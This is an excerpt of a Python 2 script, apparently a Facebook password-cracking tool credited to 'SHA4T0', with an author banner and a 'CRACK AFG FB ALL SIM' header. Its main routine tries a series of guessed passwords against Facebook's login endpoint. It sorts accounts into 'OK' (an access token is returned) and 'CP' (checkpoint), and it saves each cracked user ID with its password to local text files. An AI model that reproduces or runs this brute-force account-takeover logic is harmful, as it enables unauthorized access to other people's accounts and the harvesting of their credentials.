...
Mking_page = random.choice(["https://www.facebook.com/Shanto.vai.01"])
...
\033[1;97m--------------------------------------------------
\033[1;91m Author      : SHA4T0 
\033[1;91m GitHub      : https://github.com/SHA4T0
\033[1;91m Facebook     : Md Shakibur Rahman
...
def Select_menu():
    ...
    if PROFAISOR == '':
        ...
        os.system('clear')
        print logo 
        print '\x1b[1;92m CRACK AFG FB ALL SIM CREATED BY SHA4T0'
        print '\x1b[1;92m THISE SCRIPT CREATED BY SHA4T0 '
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print ' \x1b[1;93m[SHA4T0_CP] ' + k + c + user + ' | ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m[SHA4T0_OK] ' + k + c + user + ' | ' + pass2
                    okb = open('Mking.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;93m[SHA4T0_CP] ' + k + c + user + ' | ' + pass2
                    cps = open('Mking.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[SHA4T0_OK] ' + k + c + user + ' | ' + pass3
                        okb = open('SHA4T0.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[SHA4T0_CP] ' + k + c + user + ' | ' + pass3
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[SHA4T0_OK] ' + k + c + user + ' | ' + pass4
                            okb = open('SHA4T0.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[SHA4T0_CP] ' + k + c + user + ' | ' + pass4
                            cps = open('SHA4T0.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[SHA4T0_OK] ' + k + c + user + ' | ' + pass5
                                okb = open('SHA4T0.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[SHA4T0_CP] ' + k + c + user + ' | ' + pass5
                                cps = open('SHA4T0.txt', 'a')
